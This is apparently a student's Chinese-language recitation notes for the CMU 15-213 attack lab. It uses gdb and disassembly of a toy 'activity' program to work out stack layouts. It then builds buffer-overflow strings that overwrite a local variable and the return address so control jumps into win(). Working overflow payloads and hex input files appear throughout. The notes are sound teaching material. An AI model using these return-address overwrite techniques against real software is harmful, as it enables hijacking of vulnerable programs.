# Attack lab recitation 记录

- [Attack lab recitation 记录](#attack-lab-recitation-记录)
    - [普通缓冲区溢出](#普通缓冲区溢出)
    - [包含返回地址攻击的缓冲区溢出](#包含返回地址攻击的缓冲区溢出)
    - [引导程序到攻击代码](#引导程序到攻击代码)

输入`gdb activity`，开启 activity 之旅。

> Objective: The goal of this activity is to input a string that causes the program to call win(0x15213),
> and thereby win a cookie.
> 在开启之前，先查看一下`solve`函数的内容：

```c
void solve(void) {
    volatile long before = 0xb4;
    char buf[16];
    volatile long after = 0xaf;

    Gets(buf);

    if (before == 0x3331323531) {
        win(0x15213);
    }

    if (after == 0x3331323831) {
        win(0x18213);
    }
}
```

看一下`solve`的汇编代码：

```
(gdb) disas solve
Dump of assembler code for function solve:
   0x00000000000011df <+0>:     endbr64
   0x00000000000011e3 <+4>:     sub    $0x38,%rsp
   0x00000000000011e7 <+8>:     movq   $0xb4,0x28(%rsp)
   0x00000000000011f0 <+17>:    movq   $0xaf,0x8(%rsp)
   0x00000000000011f9 <+26>:    lea    0x10(%rsp),%rdi
   0x00000000000011fe <+31>:    callq  0x1279 <Gets>
   0x0000000000001203 <+36>:    mov    0x28(%rsp),%rdx
   0x0000000000001208 <+41>:    movabs $0x3331323531,%rax
   0x0000000000001212 <+51>:    cmp    %rax,%rdx
   0x0000000000001215 <+54>:    je     0x1230 <solve+81>
   0x0000000000001217 <+56>:    mov    0x8(%rsp),%rdx
   0x000000000000121c <+61>:    movabs $0x3331323831,%rax
   0x0000000000001226 <+71>:    cmp    %rax,%rdx
   0x0000000000001229 <+74>:    je     0x123c <solve+93>
   0x000000000000122b <+76>:    add    $0x38,%rsp
   0x000000000000122f <+80>:    retq
   0x0000000000001230 <+81>:    mov    $0x15213,%edi
   0x0000000000001235 <+86>:    callq  0x1169 <win>
   0x000000000000123a <+91>:    jmp    0x1217 <solve+56>
   0x000000000000123c <+93>:    mov    $0x18213,%edi
   0x0000000000001241 <+98>:    callq  0x1169 <win>
   0x0000000000001246 <+103>:   jmp    0x122b <solve+76>
End of assembler dump.
```

函数给`solve`预留了 56 个字节的空间：

1. `before = 0xb4`移动到`%rsp + 40`处
2. `after = 0xaf`移动到`%rsp + 8`处
3. `%rdi = %rsp + 16`
4. 调用`gets`
5. `%rdx = *(%rsp + 40)`，把`before`赋给`%rdx`
6. `%rax = $0x3331323531`
7. 接下来是个判断：

```c
if(rdx == rax) {
    edi = 0x15213;
    callq win
}
rdx = *(rsp + 8);
rax = 0x3331323831;
if(rdx == rax) {
  edi = 0x18213;
  callq win;
}
rsp += 40;
return;
```

完成`gets`之前的调用后，栈分布大致如下（一共 56 个字节的分配）：

1. `rsp`处没有值
2. `rsp + 8`处存储`after = 0xaf`
3. `rsp + 16 ~ rsp + 24`处存储 16 字节的`buf`
4. `rsp + 32`处 8 个字节空闲
5. `rsp + 40`处存储`before = 0xb4`
6. `rsp + 56`处存储的是调用`solve`的`return address`

### 普通缓冲区溢出

查看代码可以理解，要让程序调用`win(0x15213)`，需要让`rdx == 0x3331323531`，而在这之前`rdx = before`，所以我们的根本目的是让`before = 0x3331323531`。就得让`buf`前 24 个字节为 0，后八个字节等于`0x3331323531`。该机器为小端法机器，那么这 8 个字节从低地址到高地址的顺序应该是：`0x31 0x35 0x32 0x31 0x33 0x00 0x00 0x00`，这 8 个个字节翻译成`ASCII码`就是`15213`。此外`gets`一定要读到`\n`字符，它会把`\n`替换为`\0`字符。它不是读到`\0`字符就终止。后面不需要加`0`，因为`0`的`ASCII`编码是`0x30`。如果最后加了 3 个`0`的话，最后 8 个字节的地址就会变成`0x31 0x35 0x32 0x31 0x33 0x30 0x30 0x30`。

> 有几条要注意的点：
>
> 1. 机器为小端法机器，写内存的时候要把数字倒过来
> 2. `0x00`是在 ASCII 码里面是空字符，`0x30`在 ASCII 码里面是`0`
> 3. `gets`要读到`\n`，他会把`\n`替换成`\0`存储在`buf`中，无需手动`\0`
> 4. 输入的时候只能输入字符串，而不能输入 10 进制或者 16 进制的值，如果函数没有调用`atoi`，输入一律被当作字符串处理。因此我们需要输入`0x3331323531`对应的`ASCII`编码，而不是这个值本身。

输入`01234567890123456789012315213`，成功调用`win(0x15213)`。如下：

```
gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec5/src$ ./activity
01234567890123456789012315213
You win 1 cookie! Great start!
Returning normally from main
```

### 包含返回地址攻击的缓冲区溢出

要让这个`solve`函数跳转到我们插入的代码段（未开启栈随机化/`canary`/`NX bit`及其他防护机制，不考虑`nop sled`），我们需要利用缓冲区溢出，让`return address`修改为我们所插入的代码段的地址。我们需要让`buf`的前 40 个字节为任意内容，最后 8 个字节为我们插入的攻击代码的地址。

我们这次的目的是想调到`<solve +93>`位置处，本次运行过程中该位置的地址是`0x000055555555523c`，过会儿我们要将其插入`buf`的第 48-48 字节处。该地址的值换算成小端法是`0x3c 0x52 0x55 0x55 0x55 0x55 0x00 0x00`。其对应的`ASCII码`是`<RUUUU`，后面的`null`为`0x00`。我们要让程序返回的时候跳转到`mov $0x18213,%edi`。那么构造的字符串应该是`0123456789012345678901234567890123456789<RUUUU`。结果如下：

```
43          if (after == 0x3331323831) {
(gdb) n
solve () at activity.c:44
44              win(0x18213);
(gdb)
You win 2 cookies! Woohoo!
0x0000000000000000 in ?? ()
```

成功！

### 引导程序到攻击代码

此处我们进行更进阶的攻击，程序中函数`solve()`并未调用过`win(0x18613)`，让我们尝试返回到`win(0x18613)`中。此时我们不光只破解`solve()`，还需要对`win`函数的代码进行分析。结果如下：

```
(gdb) disas win
Dump of assembler code for function win:
   0x0000555555555169 <+0>:     endbr64
   0x000055555555516d <+4>:     sub    $0x8,%rsp
   0x0000555555555171 <+8>:     cmp    $0x15213,%edi
   0x0000555555555177 <+14>:    je     0x5555555551a7 <win+62>
   0x0000555555555179 <+16>:    cmp    $0x18213,%edi
   0x000055555555517f <+22>:    je     0x5555555551b5 <win+76>
   0x0000555555555181 <+24>:    cmp    $0x18613,%edi
   0x0000555555555187 <+30>:    je     0x5555555551c3 <win+90>
   0x0000555555555189 <+32>:    mov    0x2ea1(%rip),%eax        # 0x555555558030 <mystery>
   0x000055555555518f <+38>:    cmp    $0x15513,%eax
   0x0000555555555194 <+43>:    je     0x5555555551d1 <win+104>
   0x0000555555555196 <+45>:    lea    0xed3(%rip),%rdi        # 0x555555556070
   0x000055555555519d <+52>:    callq  0x555555555030 <puts@plt>
   0x00005555555551a2 <+57>:    add    $0x8,%rsp
   0x00005555555551a6 <+61>:    retq
   0x00005555555551a7 <+62>:    lea    0xe5a(%rip),%rdi        # 0x555555556008
   0x00005555555551ae <+69>:    callq  0x555555555030 <puts@plt>
   0x00005555555551b3 <+74>:    jmp    0x5555555551a2 <win+57>
   0x00005555555551b5 <+76>:    lea    0xedc(%rip),%rdi        # 0x555555556098
   0x00005555555551bc <+83>:    callq  0x555555555030 <puts@plt>
   0x00005555555551c1 <+88>:    jmp    0x5555555551a2 <win+57>
   0x00005555555551c3 <+90>:    lea    0xe5e(%rip),%rdi        # 0x555555556028
   0x00005555555551ca <+97>:    callq  0x555555555030 <puts@plt>
   0x00005555555551cf <+102>:   jmp    0x5555555551a2 <win+57>
   0x00005555555551d1 <+104>:   lea    0xe78(%rip),%rdi        # 0x555555556050
   0x00005555555551d8 <+111>:   callq  0x555555555030 <puts@plt>
   0x00005555555551dd <+116>:   jmp    0x5555555551a2 <win+57>
End of assembler dump.
```

我们需要跳转到`if(arg == 0x18613)`后面那句，也就是`<win+90>`处，该条指令的地址是`0x00005555555551c3`，转化成小端法是`0xc3 0x51 0x55 0x55 0x55 0x55 0x00 0x00`，转化成`ASCII码`也就是`ÃQUUUU`。因此，我们构造的字符串应该是`0123456789012345678901234567890123456789ÃQUUUU`。结果如下：

```
(gdb) p $rsp
$2 = (void *) 0x555555559018 <my_stack+4056>
(gdb) x/s 0x555555559018
0x555555559018 <my_stack+4056>: "ÃQUUUU"
(gdb) x/6bx 0x555555559018
0x555555559018 <my_stack+4056>: 0xc3    0x83    0x51    0x55    0x55    0x55
```

这里出现了一点问题，就是`Ã`采用`Unicode`扩展编码，其编码为`0xc3 0x83`，而我们仅仅需要`0xc3`，因此我们需要将 16 进制的地址写在文件里，然后用文件作为`activity`的输入。

[Slides 中最后一页](https://www.cs.cmu.edu/afs/cs/academic/class/15213-f23/www/recitations/rec04_slides.pdf)告诉我们，提供了`hex2raw`脚本，可以把 16 进制值写到`input2.txt`中，然后通过`hex2raw`转化为`input2.bin`。我们在`input2.txt`中写入值`30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 31 35 32 31 33 00 30 31 32 33 34 35 36 37 38 39 c3 51 55 55 55 55`，将其转化，然后输入`./activity < ../inputs/input2.bin`。
结果如下：

```
(gdb) r < ../inputs/input2.bin
Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/rec5/src/activity < ../inputs/input2.bin
You win 3 cookies! That's right!

Program received signal SIGSEGV, Segmentation fault.
```

成功！
